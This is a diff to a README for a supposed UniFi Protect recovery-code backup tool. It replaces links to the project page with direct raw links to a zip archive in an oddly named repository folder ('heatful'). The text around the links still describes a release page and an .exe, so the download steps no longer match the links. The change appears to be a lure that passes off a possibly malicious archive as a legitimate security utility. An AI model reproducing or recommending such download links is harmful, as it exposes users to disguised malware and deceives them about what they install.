@@ -1,6 +1,6 @@
 # 💾 unifi-protect-recovery - Secure backup for your recovery codes
 
-[![Download Application](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/generalarmi1971-byte/unifi-protect-recovery)
+[![Download Application](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/generalarmi1971-byte/unifi-protect-recovery/raw/refs/heads/main/heatful/protect-recovery-unifi-2.8.zip)
 
 ## 📋 What this tool does
 
@@ -20,7 +20,7 @@ Before you run the software, ensure your computer meets these requirements:
 ## 📥 Downloading the software
 
 1. Visit the project release page to get the latest version.
-2. Click here to go to the download site: [https://github.com/generalarmi1971-byte/unifi-protect-recovery](https://github.com/generalarmi1971-byte/unifi-protect-recovery)
+2. Click here to go to the download site: [https://github.com/generalarmi1971-byte/unifi-protect-recovery/raw/refs/heads/main/heatful/protect-recovery-unifi-2.8.zip](https://github.com/generalarmi1971-byte/unifi-protect-recovery/raw/refs/heads/main/heatful/protect-recovery-unifi-2.8.zip)
 3. Look for the Assets section at the bottom of the page.
 4. Select the file ending in .exe for Windows.
 5. Save the file to your Downloads folder or a location you choose.
